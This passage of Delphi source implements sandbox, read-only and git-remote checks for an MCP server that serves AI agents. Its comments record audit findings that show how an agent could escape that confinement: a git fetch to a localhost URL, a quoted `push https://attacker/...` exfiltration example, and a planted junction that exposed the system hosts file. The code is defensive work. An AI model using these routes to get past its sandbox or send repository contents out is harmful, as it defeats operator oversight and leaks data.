  excepcion de todo el servidor y se retiro el 19-sep-2026 (v0.98: nada
  global, ni seccion global). Field 2026-08-24: an agent working on project A could
  run the deployed binary of project B. }
function RemoteRunProjectDenied(const APath: string): string;

{ Read-only mode. Two independent sources, OR-ed together:
  - process-wide: the whole server runs read-only (--readonly flag);
  - per-request: the HTTP transport marks the current worker thread according
    to which credential the request presented (full token = read-write,
    read-only token / anonymous read-only = read-only). }
procedure SetProcessReadOnly(AValue: Boolean);
procedure SetRequestReadOnly(AValue: Boolean);

{ Whether the CURRENT request/process is read-only (for delphi_workspace). }
function IsReadOnlyNow: Boolean;

{ THE single entry gate, consulted by the tools dispatcher before ANY tool
  executes. '' = allowed; otherwise the rejection message returned to the
  agent. In read-only mode every mutating tool is refused; delphi_git is
  mixed and resolved by its "command" argument (query commands pass).
  It also NORMALIZES the arguments in place: virtual drive units
  (srvd:\x -> D:\x) are expanded here, before any check or tool. }
{ Cuantos parametros de todo el contrato vigila el suelo de la jaula: los
  marcados [RutaDelServidor], leidos por RTTI del registro real de tools. Se
  publica (delphi_workspace) para que un suelo VACIO se pueda ver: es una
  capa redundante, y si dejase de funcionar no romperia nada. }
function ServerPathParamCount: Integer;

{ Trocea una linea de argumentos con las reglas del runtime de C de Windows
  (CommandLineToArgvW), las mismas que aplica git.exe: las comillas dobles
  agrupan y desaparecen ("mis notas.txt" es UNO), "" dentro de comillas es una
  comilla literal, y una barra invertida solo es especial ante una comilla. Es
  el UNICO troceador: el argv que remote-run da al programa, las rutas de stash
  push de delphi_git y el filtro de opciones de git (GitArgDenied/
  GitRemoteDenied), que asi juzga cada argumento TAL COMO lo recibira git. Su
  inversa, aqui al lado, es el compositor EnComillas. Vivia en
  Lsp.RemoteRun y la 1.5.1 le escribio un gemelo aqui (PartirArgs) sin verlo:
  ahora es uno, donde lo alcanzan los dos. }
function TrocearArgs(const AArgs: string): TArray<string>;

{ La INVERSA de TrocearArgs: compone UN argumento para una linea de comando que
  el CRT de Windows (git.exe, spawn directo sin shell) vuelve a trocear EXACTO
  en este argumento. Dobla las barras invertidas que preceden a una comilla -
  incluida la de cierre - y escapa cada comilla con \". Un solo nombrador: quien
  COMPONE una linea de git la usa; quien la LEE, TrocearArgs. Vivia en
  Mcp.Tools.Workspace y volvio aqui, con su inversa, el 26-sep-2026. }
function EnComillas(const AValor: string): string;
function NombreDeMensajeGit: string;

{ La mitad de CONSULTA de delphi_git: lo que una credencial de solo lectura
  y un proyecto de REFERENCIA (ReadOnlyRoots) pueden ejecutar. UNA lista:
  la consulta ToolCallDenied y la consulta la propia tool. }
function GitCommandIsQuery(const ACmd, AArgs, AMessage: string): Boolean;

type
  { El ACCESO de una tool para una credencial de solo lectura: la lee entera
    (atLectura), la niega entera (atEscritura) o depende del comando (atMixta:
    Lecturas = lo que LEE; lo que no este ahi se niega, cerrado). UNA tabla
    (ACCESOS, en ConstruyeAccesos): la mira la puerta (LecturaDenegada) y la
    anuncia tools/list (annotations.readOnlyHint y _meta.access /
    readOnlyCommands, AnunciaAcceso), de donde TOOLS.md saca su linea Access
    y test_http_auth mide el anuncio contra la puerta. Antes la lista de
    mutantes estaba DOS veces en la puerta (una con delphi_desktop y otra
    sin) y cada mixta en su if; la linea Access del doc, a mano (28-sep-2026). }
  TAccesoTool = (atLectura, atEscritura, atMixta);
  TAccesoDeTool = record
    Tool: string;
    Acceso: TAccesoTool;
    Lecturas: TArray<string>; // atMixta: los comandos que leen ('' = el primero)
    Parametro: string;        // atMixta: el parametro que lleva el comando
    // atMixta: comandos que leen SOLO con una condicion (pares comando,
    // condicion en texto): se anuncian como readOnlyWhen; quien decide es la
    // puerta (git por GitCommandIsQuery, adb logcat por out=)
    Condiciones: TArray<string>;
    // atLectura con un efecto fuera del workspace (un reporte que se
    // escribe, un mensaje que se consume): la credencial de solo lectura
    // puede llamarla, pero readOnlyHint (MCP: "no modifica su entorno") es
    // falso y _meta.sideEffect lo dice (undecima revision)
    Efecto: string;
  end;

{ La fila de la tabla para una tool; lo que no esta en ella LEE. }
function AccesoDeTool(const ATool: string): TAccesoDeTool;
{ '' si una credencial de solo lectura puede hacer ESTA llamada; si no, la
  negativa READ-002 con lo que pedia. delphi_git decide por argumentos
  (GitCommandIsQuery: branch/tag sin ellos listan, worktree y stash solo list), el
  resto por la tabla. Fuera del modo solo lectura, siempre ''. }
{ LA clasificacion de una llamada: LEE o ESCRIBE, por la tabla ACCESOS y los
  argumentos (el comando de una mixta, ComandoDeTest, logcat out=, la mitad
  de consulta de git). AQue: como se nombra la llamada en una negativa. La
  hacen la puerta de solo lectura (LecturaDenegada) y el suelo de la jaula
  (ArgPathOutsideDenied): una tool que ESCRIBE no lleva la pista de lectura
  de la zona en su negativa (duodecima revision, r12c). Vivia dentro de
  LecturaDenegada y el suelo no la podia usar. }
function LlamadaLee(const AToolName: string; const AArguments: TJSONObject;
  out AQue: string): Boolean;
function LecturaDenegada(const AToolName: string; const AArguments: TJSONObject): string;
{ Lo que tools/list anuncia de la tool, desde la tabla: annotations
  (readOnlyHint, MCP) y _meta (access: read-only | read-write | mixed;
  las mixtas, commandParameter y readOnlyCommands). }
procedure AnunciaAcceso(const AToolName: string; const AEntry: TJSONObject);

function ToolCallDenied(const AToolName: string;
  const AArguments: TJSONObject): string;

{ Virtual drive units. The drive letters of this SERVER travel to the client
  as srvd:, srvc:, ... so a model never mistakes server paths for its own
  local disks (measured confusion in the field test). Round trip:
  - inbound: the entry gate expands srvX: in tool arguments (whole-value
    prefix match only, and never inside content-carrying parameters);
  - outbound: MaskDriveText rewrites every served drive prefix in a tool's
    textual result - one generic rule, so compiler/git/LSP output and even
    8.3 short forms (D:\PROYEC~1) are covered - EXCEPT the ECHO of the tools
    whose text is content (TOOLS_ECO: delphi_read, the hits of
    delphi_search, vault_read / vault_search, the read-back of delphi_edit /
    delphi_textedit, the help pages of delphi_docs), which must reach the
    client verbatim (an edit anchor built from masked text would not match
    the disk). What those tools compose themselves still goes through
    MaskDriveText('', ...). delphi_fetch is NOT exempt: its payload is
    base64, which the mask cannot corrupt.
  With a tool name it is THE outbound filter (Lsp.Host's ResultFilter, once
  per answer): it spends what the call left noted (TSalidaHecha, the disk
  citations of CitaDeLinea). A tool masking a piece of its own uses ''; four
  tools masked their whole answer again with their own name, and the real
  line of a delphi_changeset refusal left masked (4-oct-2026). }
function MaskDriveText(const AToolName, AText: string): string;
{ Para la tool cuya respuesta mezcla lineas SUYAS con lineas de CONTENIDO del
  disco (delphi_git diff / show / log: las de un fichero o de un mensaje de
  commit empiezan por +, - o espacio): enmascara las demas, una a una, y
  deja el contenido como esta. El filtro de salida de ESTA llamada deja pasar
  ese texto, y solo ese, tal cual (lo recuerda el hilo; OlvidaSalidaHecha lo
  borra al empezar cada llamada). El barrido entero reescribia las lineas de
  un diff como si fueran rutas del servidor: un '\\equipo' de un literal
  salia '\\srvhost' y un 'Z:\x', 'srv0:\x' (medido el 1-oct-2026). }
function EnmascaraSalvoContenido(const ATexto, AEmpiezaPor: string): string;
procedure OlvidaSalidaHecha;
{ LA cita de una linea de un fichero, 'N|texto' (N 1-based, el texto tal
  cual; la sangria de delante la pone quien la escribe): lo que un agente
  copia para construir un ancla. La componen delphi_read, vault_read y las
  pistas y los ecos de delphi_edit y delphi_changeset, y nadie mas a mano:
  habia siete escritores con cuatro formas ('N|', '  N|', 'N| ' con el texto
  recortado). Y el filtro de salida deja tal cual, en la respuesta de
  CUALQUIER tool, las lineas que esta funcion compuso en ESTA llamada, y solo
  esas: adivinaba por la forma ('^\s*\d+\|'), y en las negativas de las tools
  de eco pasaba sin mascara toda linea que lo pareciera, la escribiera quien
  la escribiera; las de las demas tools se enmascaraban, y una pista de
  delphi_changeset no servia de ancla (revision del 4-oct-2026). }
function CitaDeLinea(N: Integer; const ATexto: string): string;
{ Para la tool que devuelve JSON con CONTENIDO de un fichero en algunos
  campos (references y rename_symbol: "text" y "anchor", la linea tal cual;
  symbols: las declaraciones; signature y completion: la documentacion; NO
  delphi_designer: su get devuelve las lineas del .dfm como texto, por el
  filtro general):
  enmascara todas las demas cadenas y deja esos campos, con todo lo que cuelga
  de ellos, como estan; el filtro de salida de ESTA llamada deja pasar el
  resultado. Lo que no se nombra se enmascara: un campo nuevo no se escapa.
  Si AJson no es JSON, sale entero enmascarado. ADetras: lo que la tool pega
  detras del JSON (una nota), enmascarado entero. }
function EnmascaraJsonSalvo(const AJson: string; const AClaves: array of string;
  const ADetras: string = ''): string;
{ Para un texto markdown con bloques de codigo (delphi_hover: la declaracion
  que da el motor, entre ```): enmascara lo de fuera de los bloques y deja el
  codigo como esta; el filtro de salida de ESTA llamada deja pasar el
  resultado. Una constante con una ruta salia con la letra virtual. }
function EnmascaraSalvoCodigo(const ATexto: string): string;

{ Inbound expansion of ONE value ('srvd:\x' -> 'D:\x'; anything else
  untouched, an unserved unit stays literal). Exposed for the /files download
  route, which receives its path as a query parameter, not as a tools/call
  argument - the same door, entered from HTTP. }
function ExpandDriveValue(const AValue: string): string;

{ The letter of a value shaped like a virtual unit ('srvd:', 'srvd:\x'),
  #0 otherwise. After ExpandDriveValue a non-#0 answer means an UNSERVED
  unit: refuse it by name, never let it near GetFullPath. }
function VirtualUnitLetter(const AValue: string): Char;

{ Expands $(NAME) macros with the IDE's environment table (AVars as
  NAME=VALUE, see Lsp.Discovery.IdeEnvironmentVars). Exposed for the search
  path vetting of delphi_config: a path with macros must resolve before the
  jail can judge it. }
function ExpandIdeMacros(const AText: string; AVars: TStrings): string;

{ '' when AText carries none of the shell metacharacters that would break a
  command line ( ; | & ` $ < > and newlines ), otherwise a refusal. For tool
  arguments that end up on a paclient/msbuild command line. }
function ShellArgDenied(const AText: string): string;

{ Whether a git argument names a remote the operator has NOT allowed.

  Measured 2026-08-25 by an auditor working only through MCP: `delphi_git
  command=fetch args="http://127.0.0.1:3131/mcp"` made the SERVER open a
  connection to that address, and `push https://attacker/... HEAD:main` would
  have walked the jail's contents out of the building. The agent's universe is
  supposed to end at the jail; an arbitrary outbound URL turns the server into
  a proxy into its own network (localhost, internal services, metadata
  endpoints) and into an exfiltration channel.

  So: an EXPLICIT url in a git argument must match GitRemotes= del workspace
  activo, a
  comma-separated list of host names the operator wrote down. With that
  setting empty - the default - explicit URLs are refused outright. The remotes
  the OPERATOR configured in the repository keep working untouched (`push
  origin main` names a remote, not a URL): the decision about where this
  machine may talk to belongs to whoever owns the machine. }
function GitRemoteDenied(const AText: string): string;

{ El host de una direccion de RED de git; '' si no lo es (un nombre, una
  rama, una carpeta). El lector de GitRemoteDenied, en la interface desde la
  1.7.7: la tool de git pregunta con el si el remoto de una llamada es de red
  o es una carpeta, que pasa por la jaula. UN lector de "esto es una
  direccion de red". }
function GitUrlHost(const AToken: string): string;

implementation

uses
  Winapi.Windows,
  Winapi.TlHelp32,      // HayOtraInstanciaViva: los procesos por su nombre, sin abrirlos
  System.SysUtils,
  System.StrUtils,
  System.IniFiles,
  System.IOUtils,
  System.SyncObjs,
  System.Generics.Collections,
  System.Rtti,
  MCPServer.Types,      // BearerToken: UN lector de la cabecera Authorization
  MCPServer.Serializer, // NormalizeKey: ONE rule for argument names
  MCPServer.Tool.Base,     // IMCPToolParams: la clase de parametros de una tool
  MCPServer.Registration,  // el registro REAL de tools, no una lista nuestra
  Lsp.Attributes,          // [RutaDelServidor]
  Lsp.Dproj,            // CanonicalPlatform: the platform whitelist already exists
  System.RegularExpressions,
  System.Hash,
  Lsp.Patch,            // TrashFolderName: el nombre de la papelera, de SU nombrador
  Lsp.NetDrives,        // las letras de red de los sitios declarados
  Lsp.Sandbox,          // PurgaContenedoresHuerfanos: la otra mitad de la casa
  Lsp.Texts,
  Lsp.Json;

type
  { A token-scoped sandbox from a [Workspace.<name>] section. }
  TWorkspaceDef = record
    Name, Token, ReadOnlyToken, Profile: string;
    Roots: TArray<string>;
    // Carpetas de DENTRO del root que se leen pero no se escriben. Mismo
    // trato que la zona de biblioteca del IDE, que ya existia con esa
    // semantica pero cableada. Nace el 20-sep-2026: el root de este repo
    // contiene dos clones de referencia con su PROPIO git (gdk-mcp,
    // skybuck-mcp), y estrechar la jaula al repo los metio dentro con
    // permiso de escritura. Como son repos aparte, un descuido ahi ni
    // siquiera aparece en el "git status" del principal. David no quiere
    // sacarlos fuera, y tiene razon: lo relacionado con el proyecto vive en
    // la carpeta del proyecto, que es lo que encuentra quien lo clona. Asi
    // que la proteccion la pone la configuracion, no la memoria del agente.
    ReadOnlyPaths: TArray<string>;
    ReadOnlyRoots: TArray<string>;    // proyectos de referencia: se leen, no se escriben
    Invalid: Boolean; // Roots= had text but nothing parsed: fail closed
    // Capacidades del workspace. Desde el 19-sep-2026 (v0.98) NO se
    // hereda NADA de ningun sitio (decision David, rematando la del
    // 2026-09-11: "cada workspace lleva su par, sus roots Y sus configs").
    // Un workspace con nombre tiene EXACTAMENTE lo que declara: tri-estado
    // ausente (-1) = APAGADO, lista ausente = VACIA = nada permitido. Las
    // G* de este modulo alimentan SOLO el modo local de lanzamiento (el
    // entorno de quien arranca el proceso: baterias, desarrollo); el ini
    // NO tiene seccion generica desde v0.98.
    OvAllowTests, OvAllowRemoteRun, OvAllowBuildScripts,
      OvLibraryZone, OvAgentConfinement: Integer;
    OvSharedSet: Boolean;             // SharedFolders= present in the section
    OvSharedFolders: TArray<string>;
    // A donde puede llegar ESTE workspace: sin declarar = a ninguna parte.
    GitRemotes: string;               // hosts que un git clone/push puede nombrar
    RemoteHosts: string;              // hosts que un dial PAServer puede marcar
    RemoteProjects: TArray<string>;   // proyectos ejecutables en un target
    VaultPath: string;                // vault de conocimiento de ESTE workspace
    OvVaultReadOnly: Integer;         // tri-estado: ausente = solo lectura
    AdbDevices: TArray<string>;       // dispositivos delphi_adb; ausente = ninguno
  end;

var
  // Modo local de lanzamiento (baterias, desarrollo): lo carga LoadSecurity
  // con todo lo demas. Sin banderas perezosas por clave (25-sep-2026).
  GRoots: TArray<string>;
  GRootsInvalid: Boolean = False; // Roots= had text but NO valid root: fail closed
  // El modo local (sin workspace activo) no admite nada, y por que (un
  // SF_CIERRE_* ya formado); '' = abierto. Lo pone el cargador: una
  // proteccion del entorno que no se cargo, o el token de un workspace cerrado.
  GLocalCerrado: string = '';
  GRoPaths: TArray<string>;       // ReadOnlyPaths del modo local
  GRoRoots: TArray<string>;       // ReadOnlyRoots del modo local
  GVaultEnvWritable: Boolean = False; // DELPHI_MCP_VAULT_READONLY=0
  GProcessReadOnly: Boolean = False;
  GSecLoaded: Boolean = False;
  GAuthToken: string;
  GIdentLock: TCriticalSection;
  GSesiones: TList<TSesion>;  // sesiones HTTP: id, nombre atado en initialize, ultimo uso
  GCaducadas: TStringList;    // las ultimas que caducaron: su motivo no se pierde al purgarlas
  GSessionTimeoutMin: Double = -1; // -1 = sin leer todavia
  GIniBindIP: string;              // [Server] BindIP
  GIniSessionTimeout: string;      // [Server] SessionTimeoutMinutes, sin parsear
  GIniEngineIdle: string;          // [Server] EngineIdleMinutes, sin parsear
  GEngineIdleMin: Double = -1;     // -1 = sin leer todavia
  GIniMaxEngines: string;          // [Server] MaxEngines, sin parsear
  GMaxEngines: Integer = -1;       // -1 = sin leer todavia
  GIniLogLines: Integer = 2000;    // [Log] LinesPerFile
  GIniLogMaxFiles: Integer = 10;   // [Log] MaxFiles

  GReadOnlyToken: string;
  GAllowRemoteRun: Boolean = False; // remote-run is OFF unless opted in
  GLibraryZone: Boolean = True;     // the read-only library zone, on by default
  GDelphiVersion: string = '';      // [Server] DelphiVersion: el Delphi del servidor
  GDelphiUpdate: string = '';       // [Server] DelphiUpdate: el update que declara el operador
  GIniCargadoEn: TDateTime = 0;     // la fecha del settings.ini que tiene cargado este proceso
  GIniIlegible: string = '';        // por que no se lee el settings.ini (un BOM delante de una seccion): no arranca
  GServerIniDoble: Boolean = False; // [Server] dos veces, o su DelphiVersion: la clave no se escribe
  GWorkspaceConDelphiVersion: string = ''; // un workspace con DelphiVersion= de la 1.13: la clave no se escribe
  GAllowTests: Boolean = False;     // running test suites is opt-in too
  GGitRemotes: string = '';         // hosts an explicit git URL may name
  GRemoteHosts: string = '';        // hosts a raw TCP probe may dial
  GRemoteProjects: TArray<string>;  // RemoteRunProjects del [Workspace] por defecto
  GAllowBuildScripts: Boolean = False; // build scripts OFF unless explicitly opted in
  GAgentConfinement: Boolean = False; // each agent to its own subfolder: OFF by default
  // [Tools] Profile: which tools appear in tools/list (all stay callable).
  // full (default) | coder (hides the deploy trio) | reader (LSP + reading).
  // GToolsOnly (Only=) is an explicit allowlist that overrides the profile.
  GToolsProfile: string = 'full';
  GToolsOnly: TArray<string>;
  GSharedFolders: TArray<string>;     // subfolders any agent may write (opt-in)
  GWorkspaces: TArray<TWorkspaceDef>; // [Workspace.*]: token -> its own jail
  GWorkspaceNotes: TArray<string>;    // startup findings about that config
  GAdbDevices: TArray<string>;      // DELPHI_MCP_ADB_DEVICES (lanzamiento local)
  GVaultPath: string = '';          // DELPHI_MCP_VAULT_PATH (lanzamiento local)

threadvar
  TCurrentAgent: string; // WHO is calling on THIS thread (the HTTP request)
  GRequestReadOnly: Boolean;
  TRequestWorkspaceIx1: Integer; // workspace de la peticion HTTP (lo pone el transporte)
  TSalidaHecha: string; // lo que la tool de ESTA llamada ya enmascaro (EnmascaraSalvoContenido)
  TCitasHechas: string; // las citas (CitaDeLinea) de ESTA llamada, cada una seguida de #0

var
  GStdioIx1: Integer = 0; // workspace abierto por DELPHI_MCP_TOKEN (proceso stdio)
  GStdioSoloLectura: Boolean = False; // ...y lo abrio su token de LECTURA

{ El workspace activo de ESTA llamada, indice+1; 0 = ninguno. El transporte
  HTTP lo fija por peticion; en un proceso local (stdio) vale el que abrio
  el token del entorno al cargar la seguridad - asi el cliente local tambien
  entra "con su token" cuando lo tiene, y sin token se queda en el modo
  local de lanzamiento que definan las variables de entorno. }
function TWorkspaceIx1: Integer;
begin
  Result := TRequestWorkspaceIx1;
  if Result = 0 then
    Result := GStdioIx1;
end;

{ EL resolvedor del workspace activo: la UNICA forma de preguntar "que vale
  para esta sesion". Antes cada accesor repetia el par "si hay workspace
  activo, su campo; si no, el global" (18 copias medidas el 25-sep-2026):
  una clave nueva obligaba a escribir las dos mitades a mano, y olvidar la
  del workspace hacia caer la clave al global SIN RUIDO - un token con un
  permiso que otro operador declaro para otro token. La regla de v0.98 ("un
  workspace tiene exactamente lo que declara") la cumplian 18 copias; ahora
  la cumple este par. David: "si una aplicacion repite mucho una accion hay
  que centralizarla con parametros, por salud del codigo". }
function HasActiveWS: Boolean;
begin
  Result := (TWorkspaceIx1 > 0) and (TWorkspaceIx1 <= Length(GWorkspaces));
end;

function ActiveWS: TWorkspaceDef;
begin
  Result := GWorkspaces[TWorkspaceIx1 - 1];
end;

function ModoLocalCerrado: string;
begin
  // un workspace con su token tiene su propia jaula y no lee nada del
  // entorno: el cierre del modo local no le toca
  if HasActiveWS then
    Result := ''
  else
    Result := GLocalCerrado;
end;

function NegativaDeCierre: string;
begin
  // unas Roots del entorno con texto y nada cargado cierran desde siempre
  // (GRootsInvalid), con su negativa: es el mismo estado, y va por aqui
  // para que tambien se diga ANTES de mirar nada en el disco (su comprobacion
  // iba detras de la del vault, y la pasada de los UNC la dejaba pasar).
  // Como el otro cierre, es del modo LOCAL: a quien entra con el token de
  // un workspace - su jaula es la suya, no lee las raices del entorno - no
  // le toca. Se le negaba todo (medido: con unas DELPHI_MCP_ROOTS en ruta
  // de red, que hasta la 1.8.2 cargaban, un workspace abierto contestaba
  // WS-004 a cada llamada, por stdio y por HTTP)
  if GRootsInvalid and not HasActiveWS then
    Exit(MsgText(SR_ROOTS_INVALID));
  Result := ModoLocalCerrado;
  if Result <> '' then
    Result := MsgFmt(SR_LOCAL_CERRADO_FMT, [Result]);
end;

{ 'a;b;c' -> resolved roots with trailing delimiter; quotes tolerated,
  unparseable entries ignored. Shared by the global Roots= and every
  [Workspace.*] Roots=. }
{ El nombre FINAL de una ruta que existe: sigue junctions y symlinks hasta su
  destino de verdad. False si no se puede abrir (no existe, o no hay permiso
  ni para preguntar). Acceso 0 = solo consultar, y FILE_FLAG_BACKUP_SEMANTICS
  hace falta para poder abrir CARPETAS. }
{ EL paseo hacia arriba, escrito UNA vez. Dada una ruta, busca el antecesor
  existente mas cercano que AResuelve sepa traducir y le vuelve a pegar el
  resto: el ultimo tramo de un create o un upload todavia no existe, y aun asi
  hay que canonicalizar el camino ANTES de que ningun guarda lo mire.

  Estaba escrito DOS veces. LongCanonical lo tenia desde siempre (8.3 ->
  nombre largo), y el 20-sep-2026, para cerrar el escape por junctions, escribi
  RealPath con el MISMO bucle y otra llamada de Windows - sin mirar si habia
  algo aprovechable, teniendolo en esta misma unidad. Entre las dos cambia UNA
  linea, el resolutor; el paseo era identico. Ahora es uno. }
type
  TResuelveTramo = reference to function(const ADir: string;
    out ASalida: string): Boolean;

function CanonicalSubiendo(const AFull: string;
  const AResuelve: TResuelveTramo): string;
var
  Dir, Tail, Parent, Resuelto: string;
begin
  Dir := AFull;
  Tail := '';
  while Dir <> '' do
  begin
    if AResuelve(Dir, Resuelto) then
    begin
      Result := Resuelto;
      if Tail <> '' then
        Result := IncludeTrailingPathDelimiter(Result) + Tail;
      Exit;
    end;
    Parent := TPath.GetDirectoryName(Dir);
    if (Parent = '') or SameText(Parent, Dir) then
      Break;
    if Tail = '' then
      Tail := TPath.GetFileName(Dir)
    else
      Tail := TPath.GetFileName(Dir) + '\' + Tail;
    Dir := Parent;
  end;
  Result := AFull; // nada del camino existe: se queda la forma textual
end;

function NombreFinal(const APath: string; out AReal: string): Boolean;
var
  H: THandle;
  Len: DWORD;
  Buf: array [0 .. 32767] of Char;
begin
  Result := False;
  AReal := '';
  H := CreateFile(PChar(APath), 0,
    FILE_SHARE_READ or FILE_SHARE_WRITE or FILE_SHARE_DELETE, nil,
    OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, 0);
  if H = INVALID_HANDLE_VALUE then
    Exit;
  try
    // flags 0 = FILE_NAME_NORMALIZED + VOLUME_NAME_DOS, que es lo que
    // queremos: la ruta con letra de unidad, normalizada.
    Len := GetFinalPathNameByHandle(H, Buf, Length(Buf) - 1, 0);
    if (Len = 0) or (Len >= DWORD(Length(Buf))) then
      Exit;
    SetString(AReal, PChar(@Buf[0]), Len);
    // GetFinalPathNameByHandle devuelve la forma extendida.
    if AReal.StartsWith('\\?\UNC\') then
      AReal := '\\' + AReal.Substring(8)
    else if AReal.StartsWith('\\?\') then
      AReal := AReal.Substring(4);
    Result := AReal <> '';
  finally
    CloseHandle(H);
  end;
end;

{ LA RUTA REAL, que es contra la que hay que medir la jaula.

  TPath.GetFullPath normaliza el TEXTO y no sigue reparse points, asi que un
  junction o un symlink creado DENTRO del root apuntando fuera pasaba el
  control y el sistema de ficheros servia el destino de verdad. Medido el
  2026-09-20 por un agente auditor: un junction a
  C:\Windows\System32\drivers\etc dentro del root hizo que delphi_list y
  delphi_read devolvieran el hosts de la maquina. Y no hace falta consola para
  plantarlo: un git clone con core.symlinks=true mete el enlace sin salir del
  MCP, o sea que era alcanzable por el propio agente.

  Si la ruta NO existe todavia (crear un fichero nuevo, por ejemplo), se
  resuelve el ANTECESOR existente mas cercano y se le vuelve a pegar el resto:
  lo que importa es que ningun tramo del camino salte fuera. Si no existe
  nada del camino, se queda la normalizacion textual, que es lo que habia. }
function RealPath(const APath: string): string;
var
  Base: string;
begin
  Result := APath;
  try
    // (la raiz de una unidad, con su barra: una unidad a secas es para
    // Windows su carpeta ACTUAL, y de ahi salia la ruta real de la carpeta
    // desde la que corre el servidor en vez de la de la raiz. Lsp.NetDrives)
    Base := SinBarraFinal(TPath.GetFullPath(RaizSiUnidad(APath)));
  except
    Exit;
  end;
  Result := CanonicalSubiendo(Base,
    function(const ADir: string; out ASalida: string): Boolean
    var
      A: Cardinal;
    begin
      // Un fichero NORMAL no se abre: solo un enlace redirige, y su ruta real
      // es la real de su carpeta mas su nombre largo (LongCanonical no abre
      // el fichero). Abrirlo para pedirle el nombre final le quitaba el
      // rename a otro escritor en ese instante: con un handle abierto, aunque
      // comparta el borrado, MoveFileEx no puede reemplazarlo - "rename
      // atomico fallido" y una edicion perdida en test_concurrencia (A y C,
      // 25-sep-2026, al crecer las comparaciones por ruta real).
      A := GetFileAttributes(PChar(ADir));
      if (A <> INVALID_FILE_ATTRIBUTES) and
         ((A and (FILE_ATTRIBUTE_DIRECTORY or FILE_ATTRIBUTE_REPARSE_POINT)) = 0) then
      begin
        Result := NombreFinal(TPath.GetDirectoryName(ADir), ASalida);
        if Result then
          ASalida := IncludeTrailingPathDelimiter(PrefijoSinBarra(ASalida)) +
            TPath.GetFileName(LongCanonical(ADir));
        Exit;
      end;
      Result := NombreFinal(ADir, ASalida);
      if Result then
        ASalida := SinBarraFinal(ASalida);
    end);
end;

function VaultNormalizado(const ACrudo: string): string; forward;

{ Un sitio se declara con su LETRA (David, 1-oct-2026): X:\... y nada mas.
  Una entrada de Roots, ReadOnlyRoots, ReadOnlyPaths o VaultPath que, ya
  completa, no tiene esa forma - una ruta de red (\\host\recurso\...), un
  prefijo de dispositivo (\\?\..., \\.\...) - NO se carga: la letra es lo
  que el agente ve como unidad virtual y sobre lo que esta hecho el
  enmascarador, y la de red la conecta el servidor al arrancar
  (Lsp.NetDrives). La regla dice lo que VALE, no lo que no: una lista de
  formas prohibidas dejaba pasar \\?\GLOBALROOT\Device\Mup\... (revision de
  la 1.9.0). AFull: la entrada ya pasada por GetFullPath.
  Los dos lectores de abajo dejan fuera lo que no vale - y lo que no parsea -
  y lo devuelven, como se escribio, en ARechazadas: el arranque lo dice
  (AvisaDeSitiosNoCargados). }
function EsSitioConLetra(const AFull: string): Boolean;
begin
  Result := (LetraDeRuta(AFull) <> #0) and (Length(AFull) >= 3) and
    (AFull[3] = '\');
end;

{ La entrada, como se ESCRIBIO, puede ser un sitio: sin comodines (GetFullPath
  los acepta: "vendor\*" se cargaba tal cual, no casaba con nada y no
  protegia nada, sin un aviso), y si empieza por una unidad, con su raiz
  (X:\...) o la unidad a secas (X: = su raiz, RaizSiUnidad): "X:carpeta" es
  relativa a la carpeta ACTUAL de esa unidad, y no es un sitio. (Segunda
  revision de la 1.9.0.) Tampoco la que empieza por una barra: "\vendor" es
  la raiz de la unidad ACTUAL del proceso, se cargaba contra ella sin un
  aviso y lo que el operador creia protegido se escribia (medido, tercera
  revision; una ruta de red empieza por dos y tampoco es un sitio).
  ARelativaVale: solo en ReadOnlyPaths, donde "vendor" es la carpeta vendor
  de cada raiz. En Roots, ReadOnlyRoots y VaultPath una relativa se cargaba
  contra la carpeta del PROCESO (system32 bajo el gestor de servicios): no
  esta escrita con su letra, y no es un sitio (medido, tercera revision). }
function EntradaDeSitio(const V: string; ARelativaVale: Boolean): Boolean;
begin
  Result := (V <> '') and (V.IndexOfAny(['*', '?']) < 0) and
    not CharInSet(V[1], ['\', '/']) and
    (ARelativaVale or (LetraDeRuta(V) <> #0)) and
    not ((LetraDeRuta(V) <> #0) and (Length(V) > 2) and
      not CharInSet(V[3], ['\', '/']));
end;

{ Las rutas de SOLO LECTURA de un workspace. Una entrada ABSOLUTA vale tal
  cual; una RELATIVA se resuelve contra CADA root, que es como la lee quien la
  escribe ("gdk-mcp" = la carpeta gdk-mcp de mi proyecto). No se puede reusar
  ParseRootsList para esto: aquella resuelve lo relativo contra el directorio
  ACTUAL del proceso, que bajo el SCM es system32. Misma forma canonica que
  los roots - con barra final - para que la comparacion de despues sea la
  misma y no una parecida. }
function ParseReadOnlyList(const ARaw: string;
  const ARoots: TArray<string>; var ARechazadas: TArray<string>): TArray<string>;
var
  List: TStringList;
  E, R, V, Full: string;
begin
  List := TStringList.Create;
  try
    for E in ARaw.Split([';']) do
    begin
      V := E.Trim.Trim(['"']).Trim;
      if V = '' then
        Continue;
      try
        if not EntradaDeSitio(V, True) then
          ARechazadas := ARechazadas + [V]
        else if TPath.IsPathRooted(V) then
        begin
          Full := TPath.GetFullPath(RaizSiUnidad(V));
          if EsSitioConLetra(Full) then
            List.Add(IncludeTrailingPathDelimiter(Full))
          else
            ARechazadas := ARechazadas + [V];
        end
        else
          for R in ARoots do
            List.Add(IncludeTrailingPathDelimiter(
              TPath.GetFullPath(TPath.Combine(R, V))));
      except
        // una entrada que no parsea (un comodin, un caracter que Windows no
        // admite) nunca tumba el servidor, pero tampoco se calla: se
        // ignoraba, y lo que nombraba se quedaba sin proteger (revision de
        // la 1.9.0)
        ARechazadas := ARechazadas + [V];
      end;
    end;
    Result := List.ToStringArray;
  finally
    List.Free;
  end;
end;

function ParseRootsList(const ARaw: string;
  var ARechazadas: TArray<string>): TArray<string>;
var
  List: TStringList;
  R, V, Full: string;
begin
  List := TStringList.Create;
  try
    for R in ARaw.Split([';']) do
    begin
      V := R.Trim.Trim(['"']).Trim;
      if V = '' then
        Continue;
      try
        // (la unidad a secas es su raiz: con el servidor en esa unidad,
        // GetFullPath de "N:" era la carpeta del servidor, y la jaula, ella)
        Full := TPath.GetFullPath(RaizSiUnidad(V));
        if EntradaDeSitio(V, False) and EsSitioConLetra(Full) then
          List.Add(IncludeTrailingPathDelimiter(Full))
        else
          ARechazadas := ARechazadas + [V];
      except
        // an unparseable entry never crashes the server; it is not loaded,
        // and the startup says so
        ARechazadas := ARechazadas + [V];
      end;
    end;
    Result := List.ToStringArray;
  finally
    List.Free;
  end;
end;

{ Confinamiento y carpetas compartidas: la declaracion del workspace, sin herencia. }
function AgentConfinementNow: Boolean;
begin
  if HasActiveWS then
    Exit(ActiveWS.OvAgentConfinement = 1); // ausente = apagado
  Result := GAgentConfinement;
end;

function SharedFoldersNow: TArray<string>;
begin
